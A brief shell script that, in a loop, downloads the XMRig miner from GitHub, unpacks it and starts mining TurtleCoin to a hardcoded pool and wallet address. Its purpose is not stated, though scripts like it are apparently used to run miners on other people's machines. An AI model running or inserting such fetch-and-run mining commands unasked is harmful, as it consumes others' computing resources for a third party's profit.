#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -xvf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u TRTLv1bKxPzYVQn2XGC4DTetcpd3i2QKERPeEs1BpuB6WGM4taDv3UFYrjNzbeSWWNWCVQTabujSSbXyN2cbsR4zRhcTND1oCYk -p P01 -a argon2/chukwav2 -k --randomx-1gb-pages


     echo COUNTER $COUNTER
     let COUNTER-=1
done
